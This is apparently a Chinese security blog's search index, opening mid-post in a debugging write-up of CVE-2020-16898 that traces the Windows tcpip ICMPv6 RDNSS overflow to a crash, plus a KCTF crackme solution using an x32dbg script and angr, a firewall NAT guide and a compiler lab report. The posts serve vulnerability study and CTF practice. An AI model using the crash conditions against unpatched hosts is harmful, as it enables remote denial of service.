alt="image-20201115011451109"></p><p>可以观察到wireshark抓到的数据包出现在了内存里。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012131530.png" alt="image-20201115012131530"></p><p>经历过NetioAdvanceNetBuffer函数之后，指针前进了8指向了Recursive DNS Servers。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012252209.png" alt="image-20201115012252209"></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012549322.png" alt="image-20201115012549322"></p><p>查看一下循环次数。这里的v37是对应的eax，到windbg查看一下值是多少。（8 - 1）/2 = 3 符合计算。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012835946.png" alt="image-20201115012835946"></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012924873.png" alt="image-20201115012924873"></p><p>继续运行。到达了循环中的<code>NdisGetDataBuffer</code>函数的调用处。这次观察一下返回值。返回值是第一个Recursive DNS Server值的地址。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013410360.png" alt="image-20201115013410360"></p><p>再继续的时候到达了<code>NetioAdvanceNetBuffer</code>函数，这时操作指针加了0x10。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013504624.png" alt="image-20201115013504624"></p><p> <img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013748482.png" alt="image-20201115013748482"></p><p>循环3次后指针变为<code>0x10 + 0x8 + 0x10*3  = 0x48</code>，结合wireshark的数据包可知指向的位置为伪造的结构处。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013919186.png" alt="image-20201115013919186"></p><p><code>bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A35</code> 在这个函数的返回位置下一个断点，然后等待断下。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115014242266.png" alt="image-20201115014242266"></p><p>再次进入了0x18的case。<code>bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A89</code> 在崩溃函数下断点。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115014605604.png" alt="image-20201115014605604"></p><p>查看<code>CurrentMdlOffset</code>值确实是0x48符合上面的推算。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115015559101.png" alt="image-20201115015559101"></p><p>查看具体的数据。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115015743747.png" alt="image-20201115015743747"></p><p>由第二个字节计算长度是<code>a0 * 8 = 0x500</code>，查看rdx的值。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115020435308.png" alt="image-20201115020435308"></p><p>在这个函数中会发生复制。先查看一次堆栈。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115021014263.png" alt="image-20201115021014263"></p><p>执行步过，再次查看栈。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115021001732.png" alt="image-20201115021001732"></p><p>再次g运行之后发生了崩溃。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115014445378.png" alt="image-20201115014445378"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>使用wireshark分析流量包。type为0x19 对应了上面分析时确定的case，length为偶数，可以观察到Recursive DNS Servers解析是错误的。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114011222194.png" alt="image-20201114011222194"></p><p>明显的观察到解析已经出错了，本应作为下一个开头的icmp包出现了错误。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114011531014.png" alt="image-20201114011531014"></p><h1 id="完成exp"><a href="#完成exp" class="headerlink" title="完成exp"></a>完成exp</h1><p>数据包构造只要满足几个条件即可。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115015138270.png" alt="image-20201115015138270"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN练习记录</title>
      <link href="/2020/11/03/pwn-lian-xi-ji-lu/"/>
      <url>/2020/11/03/pwn-lian-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="2020年11月3日-练习记录"><a href="#2020年11月3日-练习记录" class="headerlink" title="2020年11月3日 练习记录"></a>2020年11月3日 练习记录</h1>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>飞塔防火墙配置将内网ip映射到外网</title>
      <link href="/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/"/>
      <url>/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image(1).png" alt="Image(1)"></p><pre><code>启动以后重设密码execute factoryresetshow system interfaceconfig system interfaceedit port1set mode staticset ip 192.168.93.99 255.255.255.0   nat的其中一个地址end此时即可开启web登录</code></pre><h2 id="配置WAN"><a href="#配置WAN" class="headerlink" title="配置WAN"></a>配置WAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image.png" alt="Image"></p><h2 id="配置LAN"><a href="#配置LAN" class="headerlink" title="配置LAN"></a>配置LAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B2%5D.png" alt="Image [2]"></p><p>配置映射内网ip到外网，先配置虚拟ip</p><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B3%5D.png" alt="Image [3]"></p><h2 id="配置防火墙策略"><a href="#配置防火墙策略" class="headerlink" title="配置防火墙策略"></a>配置防火墙策略</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B4%5D.png" alt="Image [4]"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Affinic Debugger for GDB 安装注册过程</title>
      <link href="/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/"/>
      <url>/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Affinic-Debugger"><a href="#Affinic-Debugger" class="headerlink" title="Affinic Debugger"></a>Affinic Debugger</h1><p>Affinic Debugger，.aka。ADG旨在成为各种调试器的日常图形用户界面（GUI）。此构建专门针对GDB，GNU调试器和LLDB，LLVM调试器。通过图形窗口，ADG可以通过在一个视图中查看多个信息，然后单击轻松进行调试，从而释放您正在使用的调试器的全部功能。ADG还提供了一个独特的集成命令终端，供用户直接输入调试器命令以完成在文本模式下可以执行的任何任务。ADG在Linux / Windows / Mac OS X上可用。</p><p>Affinic Debugger的目标是为任何类型的用户提供最佳的调试体验。它试图通过直观的界面提供超快的速度，以操纵代码和大量数据以帮助分析。ADG提供了其他IDE无法做到的功能，例如GDB / LLDB终端，程序集调试，远程调试，反汇编，内存更新和线程调试等。ADG是一个不断发展的产品。欢迎您提供反馈意见，以帮助它变得更好，更强大。只需给我们发送电子邮件。</p><p><strong>就是一款GUI的调试器，用的是GDB或者LLDB作为后端。</strong></p><p>官方地址： <a href="http://www.affinic.com/?page_id=109" target="_blank" rel="noopener">http://www.affinic.com/?page_id=109</a></p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>分为Windows 版本和Linux 版本，</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> gdb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Affinic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMP授权keygen分析</title>
      <link href="/2020/01/11/vmp-shou-quan-keygen-fen-xi/"/>
      <url>/2020/01/11/vmp-shou-quan-keygen-fen-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> VMP </tag>
            
            <tag> keygen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tiny 实验报告</title>
      <link href="/2020/01/11/tiny-shi-yan-bao-gao/"/>
      <url>/2020/01/11/tiny-shi-yan-bao-gao/</url>
      
        <content type="html"><![CDATA[<h1 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h1><h2 id="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"><a href="#分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构" class="headerlink" title="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"></a>分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构</h2><h3 id="词法规则"><a href="#词法规则" class="headerlink" title="词法规则"></a>词法规则</h3><p>下面是LEX中的变量声明</p><p>定义段可以包含任意的C语言文件，符号说明，其代码会被直接拷贝到生成的扫描器代码文件中</p><p>声明示例如下</p><blockquote><p>%{</p><p>…</p><p>%}</p></blockquote><pre><code>digit       [0-9]number      {digit}+letter      [a-zA-Z]identifier  {letter}+newline     \nwhitespace  [ \t]+</code></pre><p>下面是一些关键字，规则段利用正则表达式来匹配模式，每当成功匹配一个模式，就对应其后“{ }” 中的代码。</p><p>语法规则示例如下</p><blockquote><p>%%</p><p>…</p><p>%%</p></blockquote><pre class="line-numbers language-c++"><code class="language-c++">"if"            {return IF;}"then"          {return THEN;}"else"          {return ELSE;}"end"           {return END;}"repeat"        {return REPEAT;}"until"         {return UNTIL;}"read"          {return READ;}"write"         {return WRITE;}":="            {return ASSIGN;}"="             {return EQ;}"<"             {return LT;}"+"             {return PLUS;}"-"             {return MINUS;}"*"             {return TIMES;}"/"             {return OVER;}"("             {return LPAREN;}")"             {return RPAREN;}";"             {return SEMI;}{number}        {return NUM;}{identifier}    {return ID;}{newline}       {lineno++;}{whitespace}    {/* skip whitespace */}"{"             { char c;                  do                  { c = input();                    if (c == EOF) break;                    if (c == '\n') lineno++;                  } while (c != '}');                }.               {return ERROR;}%%int yywrap(){ return 1;}TokenType getToken(void){ static int firstTime = TRUE;  TokenType currentToken;  if (firstTime)  { firstTime = FALSE;    lineno++;    yyin = source;    yyout = listing;  }  currentToken = yylex();  strncpy(tokenString,yytext,MAXTOKENLEN);  if (TraceScan) {    fprintf(listing,"\t%d: ",lineno);    printToken(currentToken,tokenString);  }  return currentToken;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加<code>//</code> 和 <code>/* */</code>的规则</p><pre class="line-numbers language-C"><code class="language-C">"//"             { char c;                  do                  { c = input();                    if (c == EOF) break;                  } while (c != '\n');                }"/*"             { char c;                   int d=0;                  do                  { c = input();                    if (c == '/'&&d==1)                    d=2;                    else if(c !='/'&&d==1)                     d=0;                    if (c == EOF) break;                    if (c == '\n') lineno++;                    if (c == '*') d=1;                  } while (d != 2);                }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111132822132.png" alt="image-20200111132822132"></p><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><p>需要先修改tiny.l使其多识别一种符号</p><pre class="line-numbers language-C"><code class="language-C">"while"         {return WHILE;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语法规则主要在YACC中，添加 while 语法在tiny.y文件中增加声明和定义</p><pre class="line-numbers language-C"><code class="language-C">%token WHILEwhile_stmt     : WHILE exp THEN stmt_seq END                 { $$ = newStmtNode(WHILEK);                   $$->child[0] = $2;                   $$->child[1] = $4;                 }            ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>newStmtNode(WHILEK)</code> </p><p>还需要修改<code>cgen</code>文件，增加对于<code>WHILEK</code>的处理</p><pre class="line-numbers language-c"><code class="language-c">      <span class="token keyword">case</span> WHILEK <span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span> <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"-> while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         p1 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         p2 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* generate code for test expression */</span>         savedLoc1 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>         savedLoc2 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"while: jump to else belongs here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"LDA"</span><span class="token punctuation">,</span>pc<span class="token punctuation">,</span>savedLoc1<span class="token punctuation">,</span><span class="token string">"jmp to end"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* recurse on then part */</span>         currentLoc <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitBackup</span><span class="token punctuation">(</span>savedLoc2<span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"JEQ"</span><span class="token punctuation">,</span>ac<span class="token punctuation">,</span>currentLoc<span class="token punctuation">,</span><span class="token string">"while: jmp to else"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRestore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span>  <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"&lt;- while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* WHILEK_k */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tny文件修改为,从10 倒序打印</p><pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">{</span> Sample program  in TINY language <span class="token operator">-</span>  computes factorial<span class="token punctuation">}</span>read x<span class="token comment" spellcheck="true">// sssss</span><span class="token comment" spellcheck="true">/* ddd */</span><span class="token punctuation">;</span> <span class="token punctuation">{</span> input an integer <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;</span> x then <span class="token punctuation">{</span> don't compute <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">}</span>  fact <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  repeat    fact <span class="token punctuation">:</span><span class="token operator">=</span> fact <span class="token operator">*</span> x<span class="token punctuation">;</span>    x <span class="token punctuation">:</span><span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span>  until x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  write fact  <span class="token punctuation">{</span> output factorial of x <span class="token punctuation">}</span>end<span class="token punctuation">;</span>y <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token number">0</span> <span class="token operator">&lt;</span> y then  y <span class="token punctuation">:</span><span class="token operator">=</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  write yend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>语法树：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153138350.png" alt="image-20200111153138350"></p><p>运行的效果：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153205806.png" alt="image-20200111153205806"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>KCTF 总决赛第四题</title>
      <link href="/2019/12/30/kctf-zong-jue-sai-di-si-ti/"/>
      <url>/2019/12/30/kctf-zong-jue-sai-di-si-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="西部乐园-WP"><a href="#西部乐园-WP" class="headerlink" title="西部乐园 WP"></a>西部乐园 WP</h1><h1 id="第六题-三道八佛"><a href="#第六题-三道八佛" class="headerlink" title="第六题 三道八佛"></a>第六题 三道八佛</h1><blockquote><p>题目信息：Windows </p><p>题目来源：2019 看雪CTF总决赛</p></blockquote><p>打了一次看雪总决赛，这是选取了其中的第六题，最后是由队友提交的writeup，所以会在看雪论坛找到同样的过程。</p><p>题目是多层SMC完成的对于代码的加密，使用OD加载程序以后发现跑起来非常的卡。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111011819888.png" alt="image-20200111011819888"></p><p>由于SMC的代码量很大，所以在OD中不太好用，我选择了x32dbg。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111012429056.png" alt="image-20200111012429056"></p><p>由于采用了多层的smc，所以在ida中是无法直接分析算法的。</p><p>程序开头进行两个 <strong>VirtualProtect</strong> 进行修改.修改属性为可读写执行. 下面会不断的进行代码重定位.并且操作 <strong>FS:[4] FS:[8]</strong> 等来进行保存用户输入的UserName 以及 序列号</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/723188_7CW2JQEEDFDXY5Z.png" alt="img"></p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013459617.png" alt="image-20200111013459617"></p><p>动态跑起来，可以发现最初输入的KCTF 被填充了。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013823999.png" alt="image-20200111013823999"></p><p>下面的call eax 就是进行切换堆栈，并且跳入下一层smc 中。并且开始抹除原始代码。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013943021.png" alt="image-20200111013943021"></p><pre><code>$calleax = 0$num = 0$jnzaddr = 0$f = 0$prevaddr = 0$retaddr=0$hasj=0bph 004014DFrun//input the username and passwordbphcstart:find cip,FFD0,0x200cmp $result,0je overmov $calleax,$resultbph $calleaxrunbphcinc $numStepIntoStepIntoStepOvermov $jnzaddr,cipfind_jnz:find cip,8BE55DC3,0x220cmp $result,0je nobpmov $retaddr,$resultbph $retaddr+3runbphcStepIntoStepIntoinc $nummov $jnzaddr,cipnobp:find jnzaddr,75??,0x200cmp $result,0jnz isjnzjnzs:find cip,0F85????????,0x200cmp $result,0jnz isjnzsjmp nofoundruntojnz:mov f,0bph $jnzaddr+2mov $hasj,1jmp jnzsruntojnzs:mov f,0mov $jnzaddr,$resultbph $jnzaddr+6runbphc mov $hasj,0nofound:cmp $hasj,1jnz nojumpmov $hasj,0runbphcnojump:jmp startisjnz:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzadd $jnzaddr,2jmp find_jnzisjnzs:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzscmp $hasj,1jnz nojjmp nofoundnoj:add $jnzaddr,2jmp find_jnzover:cmp f,0jnz endmov f,1jnzaddr=cipjmp find_jnzend:log decryptnum:{$num}msg &quot;over&quot;</code></pre><p>通过比对进入smc时的特征，使用x32dbg脚本，跑完发现有1403层smc，用脚本跑到最后一层，发现下面的代码是完整的函数，代码很长，还有很多重定位和混淆，故先全部提取到code文件并修正一下esi。</p><p>用IDA分析code文件，先修改基址为0x1A1857E，F5代码如下。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014720242.png" alt="image-20200111014720242"></p><p>代码比较清晰了，serial经过计算，跟用户名比较，如果相同则成功。</p><p>注意KCTF用户名不足16位，后面的填充数据也是要比较的。也就是说实际上比较的是</p><blockquote><p>4B 43 54 46 00 1A 19 18 17 16 15 14 13 12 11 10 00</p></blockquote><p>因为代码还是有点看不太懂的，所以提取反编译以后的代码，放到VS中重新编译成exe以后使用angr跑出来flag。  angr 的python代码如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    load_option <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    b <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./ConsoleApplication21.exe"</span><span class="token punctuation">,</span> load_options<span class="token operator">=</span>load_option<span class="token punctuation">)</span>    state <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x401040</span><span class="token punctuation">)</span>    concrete_addr <span class="token operator">=</span> <span class="token number">0x404378</span>    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'flag_%d'</span> <span class="token operator">%</span> i<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token punctuation">)</span>    state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>concrete_addr<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    sm <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>    <span class="token keyword">print</span> sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x4013A3</span><span class="token punctuation">)</span>    found <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>found<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> temp    solution <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> cast_to<span class="token operator">=</span>str<span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> solution<span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s    <span class="token keyword">print</span> solution<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>    <span class="token keyword">print</span> flag<span class="token punctuation">,</span> found<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后成功跑出结果。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014829398.png" alt="image-20200111014829398"></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> 看雪CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hookme</title>
      <link href="/2019/12/26/hookme/"/>
      <url>/2019/12/26/hookme/</url>
      
        <content type="html"><![CDATA[<h1 id="新的博客开始啦"><a href="#新的博客开始啦" class="headerlink" title="新的博客开始啦~"></a>新的博客开始啦~</h1><p>认真整理东西！！！ 冲！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
